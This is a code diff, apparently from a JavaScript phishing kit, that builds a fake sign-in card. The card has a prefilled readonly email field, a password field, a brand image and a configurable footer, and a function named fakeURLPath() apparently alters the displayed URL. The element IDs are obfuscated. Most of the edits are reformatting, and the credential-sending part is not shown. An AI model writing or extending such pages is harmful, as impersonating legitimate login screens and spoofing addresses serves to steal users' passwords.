@@ -42,8 +42,9 @@
     styleElement.appendChild(document.createTextNode(cssText));
     document.head.appendChild(styleElement);
   }
-function createDOM() {
-  var bgCanvas = document.createElement("div");
+
+  function createDOM() {
+    var bgCanvas = document.createElement("div");
     bgCanvas.id = "bg_canvas";
     document.body.appendChild(bgCanvas);
 
@@ -75,7 +76,7 @@ function createDOM() {
                 '<path d="M3 7l9 6 9-6"/>' +
               '</svg>' +
             '</span>' +
-          '<input class="inp_core" type="email" id="mail_x9k2" autocomplete="off" readonly>' +
+            '<input class="inp_core" type="email" id="mail_x9k2" autocomplete="off" readonly>' +
           '</div>' +
         '</div>' +
         '<div class="row_block">' +
@@ -114,16 +115,8 @@ function createDOM() {
         '</button>' +
       '</form>' +
       '<div class="base_note" id="base_node">' + config.FOOTER + ' · © 2026</div>';
+    
     document.body.appendChild(cardRoot);
-  }
-
-  
-document.addEventListener('DOMContentLoaded', function () {
-  const emailInput = document.querySelector('input[type="email"]');
-
-  if (!emailInput) {
-    console.warn('Email field not found');
-    return;
   }
 
   function applyBackground() {
@@ -172,6 +165,7 @@ document.addEventListener('DOMContentLoaded', function () {
     createDOM();
     applyBackground();
     fakeURLPath();
+
     var emailInput = document.getElementById("mail_x9k2");
     var passwordInput = document.getElementById("code_p4r7");
     var brandImg = document.getElementById("brand_img");
